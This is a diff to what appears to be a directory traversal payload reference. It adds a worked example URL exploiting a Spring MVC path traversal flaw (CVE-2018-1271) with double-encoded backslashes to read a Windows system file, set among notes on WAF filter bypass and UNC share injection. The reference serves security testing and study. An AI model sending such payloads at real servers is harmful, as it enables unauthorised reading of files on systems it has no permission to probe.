@@ -70,6 +70,8 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 \ = %255c
 ```
 
+**e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
+
 ### UNC Bypass
 
 An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
